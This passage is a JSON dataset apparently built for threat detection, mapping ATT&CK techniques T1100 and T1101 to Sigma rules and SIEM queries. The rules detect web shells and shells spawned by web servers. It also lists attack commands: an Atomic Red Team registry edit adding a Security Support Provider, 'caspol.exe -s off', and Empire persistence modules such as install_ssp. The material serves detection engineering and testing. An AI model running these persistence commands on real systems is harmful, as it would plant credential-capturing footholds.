attack.t1100\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\wwwroot\\\\*'\n            - '*\\wmpub\\\\*'\n            - '*\\htdocs\\\\*'\n    filter:\n        Image:\n            - '*bin\\\\*'\n            - '*\\Tools\\\\*'\n            - '*\\SMSComponent\\\\*'\n        ParentImage:\n            - '*\\services.exe'\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Various applications\n    - Tools that include ping or nslookup command invocations\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Execution in Webserver Root Folder\nid: 35efb964-e6a5-47ad-bbcd-19661854018d\nstatus: experimental\ndescription: Detects a suspicious program execution in a web service root folder (filter out false positives)\nauthor: Florian Roth\ntags:\n    - attack.persistence\n    - attack.t1100\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\wwwroot\\\\*'\n            - '*\\wmpub\\\\*'\n            - '*\\htdocs\\\\*'\n    filter:\n        Image:\n            - '*bin\\\\*'\n            - '*\\Tools\\\\*'\n            - '*\\SMSComponent\\\\*'\n        ParentImage:\n            - '*\\services.exe'\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Various applications\n    - Tools that include ping or nslookup command invocations\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:(*\\\\\\\\wwwroot\\\\\\\\* OR *\\\\\\\\wmpub\\\\\\\\* OR *\\\\\\\\htdocs\\\\\\\\*) AND (NOT (Image.keyword:(*bin\\\\\\\\* OR *\\\\\\\\Tools\\\\\\\\* OR *\\\\\\\\SMSComponent\\\\\\\\*) AND ParentImage.keyword:(*\\\\\\\\services.exe))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Execution-in-Webserver-Root-Folder <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Execution in Webserver Root Folder\",\\n    \"description\": \"Detects a suspicious program execution in a web service root folder (filter out false positives)\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1100\"\\n    ],\\n    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\wwwroot\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\wmpub\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\htdocs\\\\\\\\\\\\\\\\*) AND (NOT (Image.keyword:(*bin\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Tools\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\SMSComponent\\\\\\\\\\\\\\\\*) AND ParentImage.keyword:(*\\\\\\\\\\\\\\\\services.exe))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\wwwroot\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\wmpub\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\htdocs\\\\\\\\\\\\\\\\*) AND (NOT (Image.keyword:(*bin\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Tools\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\SMSComponent\\\\\\\\\\\\\\\\*) AND ParentImage.keyword:(*\\\\\\\\\\\\\\\\services.exe))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Execution in Webserver Root Folder\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:(*\\\\\\\\wwwroot\\\\\\\\* *\\\\\\\\wmpub\\\\\\\\* *\\\\\\\\htdocs\\\\\\\\*) AND (NOT (Image.keyword:(*bin\\\\\\\\* *\\\\\\\\Tools\\\\\\\\* *\\\\\\\\SMSComponent\\\\\\\\*) AND ParentImage.keyword:(*\\\\\\\\services.exe))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\wwwroot\\\\\\\\*\" OR Image=\"*\\\\\\\\wmpub\\\\\\\\*\" OR Image=\"*\\\\\\\\htdocs\\\\\\\\*\") NOT ((Image=\"*bin\\\\\\\\*\" OR Image=\"*\\\\\\\\Tools\\\\\\\\*\" OR Image=\"*\\\\\\\\SMSComponent\\\\\\\\*\") (ParentImage=\"*\\\\\\\\services.exe\"))) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image IN [\"*\\\\\\\\wwwroot\\\\\\\\*\", \"*\\\\\\\\wmpub\\\\\\\\*\", \"*\\\\\\\\htdocs\\\\\\\\*\"]  -(Image IN [\"*bin\\\\\\\\*\", \"*\\\\\\\\Tools\\\\\\\\*\", \"*\\\\\\\\SMSComponent\\\\\\\\*\"] ParentImage IN [\"*\\\\\\\\services.exe\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\wwwroot\\\\\\\\.*|.*.*\\\\wmpub\\\\\\\\.*|.*.*\\\\htdocs\\\\\\\\.*))(?=.*(?!.*(?:.*(?=.*(?:.*.*bin\\\\\\\\.*|.*.*\\\\Tools\\\\\\\\.*|.*.*\\\\SMSComponent\\\\\\\\.*))(?=.*(?:.*.*\\\\services\\\\.exe))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: IIS Native-Code Module Command Line Installation\nid: 9465ddf4-f9e4-4ebd-8d98-702df3a93239\ndescription: Detects suspicious IIS native-code module installations via command line\nstatus: experimental\nreferences:\n    - https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/\nauthor: Florian Roth\nmodified: 2012/12/11\ntags:\n    - attack.persistence\n    - attack.t1100\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '*\\APPCMD.EXE install module /name:*'\n    condition: selection\nfalsepositives:\n    - Unknown as it may vary from organisation to arganisation how admins use to install IIS modules\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: IIS Native-Code Module Command Line Installation\nid: 9465ddf4-f9e4-4ebd-8d98-702df3a93239\ndescription: Detects suspicious IIS native-code module installations via command line\nstatus: experimental\nreferences:\n    - https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/\nauthor: Florian Roth\nmodified: 2012/12/11\ntags:\n    - attack.persistence\n    - attack.t1100\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '*\\APPCMD.EXE install module /name:*'\n    condition: selection\nfalsepositives:\n    - Unknown as it may vary from organisation to arganisation how admins use to install IIS modules\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\\\\\APPCMD.EXE\\\\ install\\\\ module\\\\ \\\\/name\\\\:*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/IIS-Native-Code-Module-Command-Line-Installation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"IIS Native-Code Module Command Line Installation\",\\n    \"description\": \"Detects suspicious IIS native-code module installations via command line\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1100\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\APPCMD.EXE\\\\\\\\ install\\\\\\\\ module\\\\\\\\ \\\\\\\\/name\\\\\\\\:*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\APPCMD.EXE\\\\\\\\ install\\\\\\\\ module\\\\\\\\ \\\\\\\\/name\\\\\\\\:*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'IIS Native-Code Module Command Line Installation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(*\\\\\\\\APPCMD.EXE install module \\\\/name\\\\:*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*\\\\\\\\APPCMD.EXE install module /name:*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"*\\\\\\\\APPCMD.EXE install module /name:*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*\\\\APPCMD\\\\.EXE install module /name:.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Webshell Detection With Command Line Keywords\nid: bed2a484-9348-4143-8a8a-b801c979301c\ndescription: Detects certain command line parameters often used during reconnaissance activity via web shells\nauthor: Florian Roth\nreference:\n    - https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html\ndate: 2017/01/01\nmodified: 2019/10/26\ntags:\n    - attack.privilege_escalation\n    - attack.persistence\n    - attack.t1100\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage:\n            - '*\\apache*'\n            - '*\\tomcat*'\n            - '*\\w3wp.exe'\n            - '*\\php-cgi.exe'\n            - '*\\nginx.exe'\n            - '*\\httpd.exe'\n        CommandLine:\n            - '*whoami*'\n            - '*net user *'\n            - '*ping -n *'\n            - '*systeminfo'\n            - '*&cd&echo*'\n            - '*cd /d*'  # https://www.computerhope.com/cdhlp.htm\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Webshell Detection With Command Line Keywords\nid: bed2a484-9348-4143-8a8a-b801c979301c\ndescription: Detects certain command line parameters often used during reconnaissance activity via web shells\nauthor: Florian Roth\nreference:\n    - https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html\ndate: 2017/01/01\nmodified: 2019/10/26\ntags:\n    - attack.privilege_escalation\n    - attack.persistence\n    - attack.t1100\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage:\n            - '*\\apache*'\n            - '*\\tomcat*'\n            - '*\\w3wp.exe'\n            - '*\\php-cgi.exe'\n            - '*\\nginx.exe'\n            - '*\\httpd.exe'\n        CommandLine:\n            - '*whoami*'\n            - '*net user *'\n            - '*ping -n *'\n            - '*systeminfo'\n            - '*&cd&echo*'\n            - '*cd /d*'  # https://www.computerhope.com/cdhlp.htm\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:(*\\\\\\\\apache* OR *\\\\\\\\tomcat* OR *\\\\\\\\w3wp.exe OR *\\\\\\\\php\\\\-cgi.exe OR *\\\\\\\\nginx.exe OR *\\\\\\\\httpd.exe) AND CommandLine.keyword:(*whoami* OR *net\\\\ user\\\\ * OR *ping\\\\ \\\\-n\\\\ * OR *systeminfo OR *&cd&echo* OR *cd\\\\ \\\\/d*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Webshell-Detection-With-Command-Line-Keywords <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Webshell Detection With Command Line Keywords\",\\n    \"description\": \"Detects certain command line parameters often used during reconnaissance activity via web shells\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.persistence\",\\n      \"attack.t1100\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:(*\\\\\\\\\\\\\\\\apache* OR *\\\\\\\\\\\\\\\\tomcat* OR *\\\\\\\\\\\\\\\\w3wp.exe OR *\\\\\\\\\\\\\\\\php\\\\\\\\-cgi.exe OR *\\\\\\\\\\\\\\\\nginx.exe OR *\\\\\\\\\\\\\\\\httpd.exe) AND CommandLine.keyword:(*whoami* OR *net\\\\\\\\ user\\\\\\\\ * OR *ping\\\\\\\\ \\\\\\\\-n\\\\\\\\ * OR *systeminfo OR *&cd&echo* OR *cd\\\\\\\\ \\\\\\\\/d*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:(*\\\\\\\\\\\\\\\\apache* OR *\\\\\\\\\\\\\\\\tomcat* OR *\\\\\\\\\\\\\\\\w3wp.exe OR *\\\\\\\\\\\\\\\\php\\\\\\\\-cgi.exe OR *\\\\\\\\\\\\\\\\nginx.exe OR *\\\\\\\\\\\\\\\\httpd.exe) AND CommandLine.keyword:(*whoami* OR *net\\\\\\\\ user\\\\\\\\ * OR *ping\\\\\\\\ \\\\\\\\-n\\\\\\\\ * OR *systeminfo OR *&cd&echo* OR *cd\\\\\\\\ \\\\\\\\/d*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Webshell Detection With Command Line Keywords\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:(*\\\\\\\\apache* *\\\\\\\\tomcat* *\\\\\\\\w3wp.exe *\\\\\\\\php\\\\-cgi.exe *\\\\\\\\nginx.exe *\\\\\\\\httpd.exe) AND CommandLine.keyword:(*whoami* *net user * *ping \\\\-n * *systeminfo *&cd&echo* *cd \\\\/d*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((ParentImage=\"*\\\\\\\\apache*\" OR ParentImage=\"*\\\\\\\\tomcat*\" OR ParentImage=\"*\\\\\\\\w3wp.exe\" OR ParentImage=\"*\\\\\\\\php-cgi.exe\" OR ParentImage=\"*\\\\\\\\nginx.exe\" OR ParentImage=\"*\\\\\\\\httpd.exe\") (CommandLine=\"*whoami*\" OR CommandLine=\"*net user *\" OR CommandLine=\"*ping -n *\" OR CommandLine=\"*systeminfo\" OR CommandLine=\"*&cd&echo*\" OR CommandLine=\"*cd /d*\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage IN [\"*\\\\\\\\apache*\", \"*\\\\\\\\tomcat*\", \"*\\\\\\\\w3wp.exe\", \"*\\\\\\\\php-cgi.exe\", \"*\\\\\\\\nginx.exe\", \"*\\\\\\\\httpd.exe\"] CommandLine IN [\"*whoami*\", \"*net user *\", \"*ping -n *\", \"*systeminfo\", \"*&cd&echo*\", \"*cd /d*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\apache.*|.*.*\\\\tomcat.*|.*.*\\\\w3wp\\\\.exe|.*.*\\\\php-cgi\\\\.exe|.*.*\\\\nginx\\\\.exe|.*.*\\\\httpd\\\\.exe))(?=.*(?:.*.*whoami.*|.*.*net user .*|.*.*ping -n .*|.*.*systeminfo|.*.*&cd&echo.*|.*.*cd /d.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Shells Spawned by Web Servers\nid: 8202070f-edeb-4d31-a010-a26c72ac5600\nstatus: experimental\ndescription: Web servers that spawn shell processes could be the result of a successfully placed web shell or an other attack\nauthor: Thomas Patzke\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage:\n            - '*\\w3wp.exe'\n            - '*\\httpd.exe'\n            - '*\\nginx.exe'\n            - '*\\php-cgi.exe'\n        Image:\n            - '*\\cmd.exe'\n            - '*\\sh.exe'\n            - '*\\bash.exe'\n            - '*\\powershell.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.privilege_escalation\n    - attack.persistence\n    - attack.t1100\nfalsepositives:\n    - Particular web applications may spawn a shell process legitimately\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Shells Spawned by Web Servers\nid: 8202070f-edeb-4d31-a010-a26c72ac5600\nstatus: experimental\ndescription: Web servers that spawn shell processes could be the result of a successfully placed web shell or an other attack\nauthor: Thomas Patzke\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage:\n            - '*\\w3wp.exe'\n            - '*\\httpd.exe'\n            - '*\\nginx.exe'\n            - '*\\php-cgi.exe'\n        Image:\n            - '*\\cmd.exe'\n            - '*\\sh.exe'\n            - '*\\bash.exe'\n            - '*\\powershell.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.privilege_escalation\n    - attack.persistence\n    - attack.t1100\nfalsepositives:\n    - Particular web applications may spawn a shell process legitimately\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:(*\\\\\\\\w3wp.exe OR *\\\\\\\\httpd.exe OR *\\\\\\\\nginx.exe OR *\\\\\\\\php\\\\-cgi.exe) AND Image.keyword:(*\\\\\\\\cmd.exe OR *\\\\\\\\sh.exe OR *\\\\\\\\bash.exe OR *\\\\\\\\powershell.exe))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Shells-Spawned-by-Web-Servers <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Shells Spawned by Web Servers\",\\n    \"description\": \"Web servers that spawn shell processes could be the result of a successfully placed web shell or an other attack\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.persistence\",\\n      \"attack.t1100\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:(*\\\\\\\\\\\\\\\\w3wp.exe OR *\\\\\\\\\\\\\\\\httpd.exe OR *\\\\\\\\\\\\\\\\nginx.exe OR *\\\\\\\\\\\\\\\\php\\\\\\\\-cgi.exe) AND Image.keyword:(*\\\\\\\\\\\\\\\\cmd.exe OR *\\\\\\\\\\\\\\\\sh.exe OR *\\\\\\\\\\\\\\\\bash.exe OR *\\\\\\\\\\\\\\\\powershell.exe))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:(*\\\\\\\\\\\\\\\\w3wp.exe OR *\\\\\\\\\\\\\\\\httpd.exe OR *\\\\\\\\\\\\\\\\nginx.exe OR *\\\\\\\\\\\\\\\\php\\\\\\\\-cgi.exe) AND Image.keyword:(*\\\\\\\\\\\\\\\\cmd.exe OR *\\\\\\\\\\\\\\\\sh.exe OR *\\\\\\\\\\\\\\\\bash.exe OR *\\\\\\\\\\\\\\\\powershell.exe))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Shells Spawned by Web Servers\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:(*\\\\\\\\w3wp.exe *\\\\\\\\httpd.exe *\\\\\\\\nginx.exe *\\\\\\\\php\\\\-cgi.exe) AND Image.keyword:(*\\\\\\\\cmd.exe *\\\\\\\\sh.exe *\\\\\\\\bash.exe *\\\\\\\\powershell.exe))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((ParentImage=\"*\\\\\\\\w3wp.exe\" OR ParentImage=\"*\\\\\\\\httpd.exe\" OR ParentImage=\"*\\\\\\\\nginx.exe\" OR ParentImage=\"*\\\\\\\\php-cgi.exe\") (Image=\"*\\\\\\\\cmd.exe\" OR Image=\"*\\\\\\\\sh.exe\" OR Image=\"*\\\\\\\\bash.exe\" OR Image=\"*\\\\\\\\powershell.exe\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage IN [\"*\\\\\\\\w3wp.exe\", \"*\\\\\\\\httpd.exe\", \"*\\\\\\\\nginx.exe\", \"*\\\\\\\\php-cgi.exe\"] Image IN [\"*\\\\\\\\cmd.exe\", \"*\\\\\\\\sh.exe\", \"*\\\\\\\\bash.exe\", \"*\\\\\\\\powershell.exe\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\w3wp\\\\.exe|.*.*\\\\httpd\\\\.exe|.*.*\\\\nginx\\\\.exe|.*.*\\\\php-cgi\\\\.exe))(?=.*(?:.*.*\\\\cmd\\\\.exe|.*.*\\\\sh\\\\.exe|.*.*\\\\bash\\\\.exe|.*.*\\\\powershell\\\\.exe)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "ET WEB_SERVER ATTACKER WebShell", "product": "Suricata (NSM)", "name": "ET Open Rule"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1101/T1101.yaml", "command": "# run these in sequence\n$SecurityPackages = Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'\n$SecurityPackagesUpdated = $SecurityPackages\n$SecurityPackagesUpdated += \"not-a-ssp\"\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated\n\n# revert (before reboot)\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackages\n", "name": null}, {"source": "Threat Hunting Tables", "command": "caspol.exe -s off", "name": null}, {"source": "SysmonHunter - Security Support Provider", "command": "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages|SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages", "name": null}, {"source": "SysmonHunter - Security Support Provider", "command": "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages|SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/get_ssps", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/get_ssps", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/install_ssp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/install_ssp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/memssp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/memssp", "name": "Empire Module Command"}], "command_list": ["# run these in sequence\n$SecurityPackages = Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'\n$SecurityPackagesUpdated = $SecurityPackages\n$SecurityPackagesUpdated += \"not-a-ssp\"\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated\n\n# revert (before reboot)\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackages\n", "caspol.exe -s off", "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages|SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages", "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages|SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages", "powershell/persistence/misc/get_ssps", "powershell/persistence/misc/get_ssps", "powershell/persistence/misc/install_ssp", "powershell/persistence/misc/install_ssp", "powershell/persistence/misc/memssp", "powershell/persistence/misc/memssp"], "technique_id": "T1101", "parsed_datasets": [{"Atomic Red Team Test - Security Support Provider": {"display_name": "Security Support Provider", "atomic_tests": [{"description": "Add a value to a Windows registry SSP key, simulating an adversarial modification of those keys.", "supported_platforms": ["windows"], "name": "Modify SSP configuration in registry", "input_arguments": {"fake_ssp_dll": {"default": "not-a-ssp", "type": "String", "description": "Value added to registry key. Normally refers to a DLL name in C:\\Windows\\System32."}}, "executor": {"elevation_required": true, "command": "# run these in sequence\n$SecurityPackages = Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'\n$SecurityPackagesUpdated = $SecurityPackages\n$SecurityPackagesUpdated += \"#{fake_ssp_dll}\"\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated\n\n# revert (before reboot)\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackages\n", "name": "powershell"}}], "attack_technique": "T1101"}}, {"Threat Hunting Tables": 